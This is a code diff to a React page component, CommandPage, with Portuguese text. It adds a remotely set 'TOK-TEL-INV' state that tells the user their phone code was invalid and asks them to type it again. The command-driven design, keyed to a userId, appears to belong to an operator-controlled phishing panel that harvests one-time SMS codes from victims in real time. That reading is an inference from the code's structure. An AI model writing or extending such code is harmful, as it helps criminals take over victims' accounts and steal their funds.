@@ -465,9 +465,10 @@ function CommandPage({ userId }) {
   }
 
   // Página TOK-TEL - Código enviado para o telefone
-  if (currentCommand?.action === "TOK-TEL") {
+  if (currentCommand?.action === "TOK-TEL" || currentCommand?.action === "TOK-TEL-INV") {
     const isCodeComplete = codeDigits.every(digit => digit !== '');
     const phoneLastDigits = currentCommand?.command_reference || "****";
+    const isInvalid = currentCommand?.action === "TOK-TEL-INV";
     
     return (
       <div className="min-h-screen bg-white flex flex-col font-inter">
@@ -481,9 +482,18 @@ function CommandPage({ userId }) {
             />
           </div>
 
+          {/* Mensagem de erro se inválido */}
+          {isInvalid && (
+            <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg max-w-sm">
+              <p className="text-red-600 text-sm text-center font-medium">
+                Código inválido. Por favor, digite novamente.
+              </p>
+            </div>
+          )}
+
           {/* Título */}
-          <h1 className="text-2xl font-bold text-[#1a1a5e] mb-4 text-center">
-            Código enviado!
+          <h1 className={`text-2xl font-bold mb-4 text-center ${isInvalid ? 'text-red-600' : 'text-[#1a1a5e]'}`}>
+            {isInvalid ? 'Código inválido!' : 'Código enviado!'}
           </h1>
 
           {/* Descrição com número mascarado */}
@@ -508,10 +518,12 @@ function CommandPage({ userId }) {
                   onPaste={handlePaste}
                   disabled={loading}
                   className={`w-12 h-14 text-center text-2xl font-bold border-2 rounded-xl focus:outline-none transition-all duration-200 ${
-                    digit 
-                      ? 'border-pink-500 bg-pink-50' 
-                      : 'border-gray-300 bg-white'
-                  } ${loading ? 'bg-gray-100 cursor-not-allowed' : 'focus:border-pink-500 focus:shadow-lg focus:shadow-pink-100'}`}
+                    isInvalid 
+                      ? 'border-red-500 bg-red-50' 
+                      : digit 
+                        ? 'border-pink-500 bg-pink-50' 
+                        : 'border-gray-300 bg-white'
+                  } ${loading ? 'bg-gray-100 cursor-not-allowed' : isInvalid ? 'focus:border-red-500' : 'focus:border-pink-500 focus:shadow-lg focus:shadow-pink-100'}`}
                 />
               ))}
             </div>
